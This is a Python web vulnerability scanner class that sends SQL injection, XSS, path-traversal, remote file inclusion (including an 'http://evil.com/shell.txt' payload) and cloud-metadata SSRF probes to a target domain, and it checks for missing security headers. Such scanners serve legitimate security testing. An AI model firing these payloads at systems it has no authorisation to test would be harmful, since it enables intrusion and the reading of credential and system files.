#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from rich.table import Table
from rich.console import Console
import requests
import concurrent.futures
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import re

class VulnerabilityScanner:
    def __init__(self, domain, threads=10, timeout=30):
        self.domain = domain
        self.threads = threads
        self.timeout = timeout
        self.base_url = f'http://{domain}'
        self.console = Console()
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })

    def scan(self):
        """Main scanning function"""
        try:
            # Create a table for results
            table = Table(title=f'Vulnerability Scan Results for {self.domain}')
            table.add_column('Vulnerability Type', style='cyan')
            table.add_column('URL', style='green')
            table.add_column('Details', style='yellow')
            table.add_column('Severity', style='red')

            # Run all scans
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
                scan_functions = [
                    self.scan_sql_injection,
                    self.scan_xss,
                    self.scan_file_inclusion,
                    self.scan_ssrf,
                    self.scan_security_headers
                ]
                futures = [executor.submit(func) for func in scan_functions]
                concurrent.futures.wait(futures)

            # Add results to table
            for vuln in self.vulnerabilities:
                table.add_row(
                    vuln['type'],
                    vuln['url'],
                    vuln['details'],
                    vuln['severity']
                )

            return table

        except Exception as e:
            self.console.print(f'[bold red]Error during vulnerability scan: {str(e)}[/bold red]')
            return None

    def scan_sql_injection(self):
        """Scan for SQL injection vulnerabilities"""
        payloads = [
            "' OR '1'='1",
            "1' OR '1'='1",
            "1 UNION SELECT NULL--",
            "1' UNION SELECT NULL--",
            "admin' --"
        ]

        try:
            response = self.session.get(self.base_url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')

            for form in forms:
                for payload in payloads:
                    try:
                        if form.get('method', 'get').lower() == 'get':
                            test_url = urljoin(self.base_url, form.get('action', ''))
                            response = self.session.get(test_url, params={'q': payload}, timeout=self.timeout)
                        else:
                            test_url = urljoin(self.base_url, form.get('action', ''))
                            response = self.session.post(test_url, data={'q': payload}, timeout=self.timeout)

                        if any(error in response.text.lower() for error in ['sql', 'mysql', 'sqlite', 'postgresql']):
                            self.vulnerabilities.append({
                                'type': 'SQL Injection',
                                'url': test_url,
                                'details': f'Possible SQL injection with payload: {payload}',
                                'severity': 'High'
                            })
                            break

                    except Exception:
                        continue

        except Exception as e:
            self.console.print(f'[bold red]Error during SQL injection scan: {str(e)}[/bold red]')

    def scan_xss(self):
        """Scan for Cross-Site Scripting (XSS) vulnerabilities"""
        payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            '><script>alert(1)</script>',
            '"onmouseover="alert(1)"',
            '\'><img src=x onerror=alert(1)>'
        ]

        try:
            response = self.session.get(self.base_url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')

            for form in forms:
                for payload in payloads:
                    try:
                        if form.get('method', 'get').lower() == 'get':
                            test_url = urljoin(self.base_url, form.get('action', ''))
                            response = self.session.get(test_url, params={'q': payload}, timeout=self.timeout)
                        else:
                            test_url = urljoin(self.base_url, form.get('action', ''))
                            response = self.session.post(test_url, data={'q': payload}, timeout=self.timeout)

                        if payload in response.text:
                            self.vulnerabilities.append({
                                'type': 'Cross-Site Scripting (XSS)',
                                'url': test_url,
                                'details': f'Possible XSS with payload: {payload}',
                                'severity': 'High'
                            })
                            break

                    except Exception:
                        continue

        except Exception as e:
            self.console.print(f'[bold red]Error during XSS scan: {str(e)}[/bold red]')

    def scan_file_inclusion(self):
        """Scan for Local/Remote File Inclusion vulnerabilities"""
        payloads = [
            '../../../etc/passwd',
            '....//....//....//etc/passwd',
            'file:///etc/passwd',
            'http://evil.com/shell.txt',
            'https://evil.com/shell.txt'
        ]

        try:
            for payload in payloads:
                try:
                    test_url = f'{self.base_url}?file={payload}'
                    response = self.session.get(test_url, timeout=self.timeout)

                    if any(pattern in response.text for pattern in ['root:x:', 'sbin', '/home/']):
                        self.vulnerabilities.append({
                            'type': 'File Inclusion',
                            'url': test_url,
                            'details': f'Possible file inclusion with payload: {payload}',
                            'severity': 'High'
                        })
                        break

                except Exception:
                    continue

        except Exception as e:
            self.console.print(f'[bold red]Error during file inclusion scan: {str(e)}[/bold red]')

    def scan_ssrf(self):
        """Scan for Server-Side Request Forgery vulnerabilities"""
        payloads = [
            'http://localhost',
            'http://127.0.0.1',
            'http://[::1]',
            'http://169.254.169.254',
            'http://metadata.google.internal'
        ]

        try:
            for payload in payloads:
                try:
                    test_url = f'{self.base_url}?url={payload}'
                    response = self.session.get(test_url, timeout=self.timeout)

                    if response.status_code == 200 and len(response.text) > 0:
                        self.vulnerabilities.append({
                            'type': 'SSRF',
                            'url': test_url,
                            'details': f'Possible SSRF with payload: {payload}',
                            'severity': 'High'
                        })
                        break

                except Exception:
                    continue

        except Exception as e:
            self.console.print(f'[bold red]Error during SSRF scan: {str(e)}[/bold red]')

    def scan_security_headers(self):
        """Check for missing security headers"""
        security_headers = {
            'X-Frame-Options': 'Missing X-Frame-Options header (clickjacking protection)',
            'X-XSS-Protection': 'Missing X-XSS-Protection header',
            'X-Content-Type-Options': 'Missing X-Content-Type-Options header',
            'Strict-Transport-Security': 'Missing HSTS header',
            'Content-Security-Policy': 'Missing Content Security Policy header'
        }

        try:
            response = self.session.get(self.base_url, timeout=self.timeout)
            headers = response.headers

            for header, description in security_headers.items():
                if header not in headers:
                    self.vulnerabilities.append({
                        'type': 'Missing Security Header',
                        'url': self.base_url,
                        'details': description,
                        'severity': 'Medium'
                    })

        except Exception as e:
            self.console.print(f'[bold red]Error during security headers scan: {str(e)}[/bold red]')